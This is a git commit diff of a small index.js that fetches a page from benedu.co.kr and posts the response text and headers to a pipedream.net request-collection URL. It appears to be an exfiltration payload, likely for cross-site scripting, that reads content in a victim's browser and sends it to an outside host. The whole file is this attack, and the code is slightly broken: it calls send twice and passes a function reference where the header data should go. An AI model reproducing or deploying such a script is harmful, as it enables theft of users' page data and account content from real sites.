6a2bc5df1a03122520a2dbffa1285af720257732
as3617 <46442697+as3617@users.noreply.github.com>
2020-03-05 23:19:50 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,10 @@
 var xhr = new XMLHttpRequest();
 xhr.open("GET", "https://www.benedu.co.kr/");
-xhr.send();
-fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.response);
+xhr.onreadystatechange = function() {
+    text = xhr.responseText;
+    console.log(xhr.getAllResponseHeaders);
+    y = new XMLHttpRequest();
+    y.open("POST", "https://encnu1395lyv7.x.pipedream.net/");
+    y.send(text)
+    y.send(xhr.getAllResponseHeaders)
+};
